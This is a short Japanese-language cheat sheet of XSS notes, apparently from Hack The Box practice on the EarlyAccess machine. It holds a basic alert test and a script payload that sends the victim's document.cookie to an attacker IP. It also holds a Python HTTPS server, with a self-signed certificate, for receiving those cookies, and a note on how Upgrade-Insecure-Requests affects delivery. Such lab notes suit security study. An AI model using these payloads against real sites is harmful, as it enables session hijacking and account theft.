# XSS

----

## First Check
  ```html
  <script>alert('xss');</script>
  ```

  

## Upgrade-Insecure-RequestsにおけるXSS
* 被害者側のブラウザにUpgrade-Insecure-Requestsが設定されている場合、javascriptや画像要求のhttpのリクエストがhttpsのリクエストに変換される
* したがって、XSSのペイロードが不正なhttpサイトへ誘導していても、被害者からはhttpsリクエストが発行されることがありうる
* なお、httpsサーバのセットアップはsimple http serverを利用すると簡単

* Htb: EarlyAccess

  ```html
  <script>var i=new Image;i.src="http://10.10.14.234/?"+document.cookie</script>
  ```

* simple http server

  ```python
  from http.server import HTTPServer, SimpleHTTPRequestHandler
  import ssl, os
  os.system("openssl req -nodes -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -subj '/CN=mylocalhost'")
  port = 443
  httpd = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
  httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='key.pem', certfile="cert.pem", server_side=True)
  print(f"Server running on https://0.0.0.0:{port}")
  httpd.serve_forever()
  ```

  

